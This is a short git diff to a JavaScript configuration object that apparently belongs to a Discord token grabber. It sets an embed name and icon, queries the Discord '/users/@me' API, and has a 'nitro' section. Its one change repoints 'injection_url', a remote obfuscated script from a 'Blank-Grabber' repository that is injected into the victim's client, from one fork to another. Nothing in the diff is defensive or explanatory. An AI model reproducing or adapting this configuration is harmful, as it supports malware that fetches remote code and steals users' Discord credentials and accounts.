@@ -19,7 +19,7 @@ const config = {
   embed_name: 'Festory', 
   embed_icon: 'https://cdn.discordapp.com/attachments/840966782214733824/1098244076203159694/62464d2ffea60d56a7d7b07f0f566c3e.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/festory/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
